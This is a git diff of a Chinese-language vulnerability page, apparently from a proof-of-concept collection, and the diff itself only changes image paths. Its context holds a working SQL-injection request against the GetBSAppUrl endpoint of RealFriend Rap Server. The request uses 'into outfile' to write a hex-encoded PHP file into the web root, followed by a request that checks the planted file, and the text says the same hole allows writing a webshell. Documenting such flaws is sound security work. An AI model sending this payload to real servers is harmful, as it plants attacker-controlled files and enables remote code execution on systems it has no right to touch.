@@ -20,11 +20,11 @@
 
 登陆页面
 
-![image-20230417100516425](images/image-20230417100516425.png)
+![image-20230417100516425](../.gitbook/assets/image-20230417100516425.png)
 
 在 GetBSAppUrl 方法中存在SQL注入漏洞，通过漏洞可以写入Webshell文件
 
-![image-20230417100529493](images/image-20230417100529493.png)
+![image-20230417100529493](../.gitbook/assets/image-20230417100529493.png)
 
 验证POC
 
@@ -32,10 +32,10 @@
 /index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\test7.php%27%23/123
 ```
 
-![image-20230417100544162](images/image-20230417100544162.png)
+![image-20230417100544162](../.gitbook/assets/image-20230417100544162.png)
 
 ```
 /test7.php
 ```
 
-![image-20230417100554583](images/image-20230417100554583.png)
+![image-20230417100554583](../.gitbook/assets/image-20230417100554583.png)
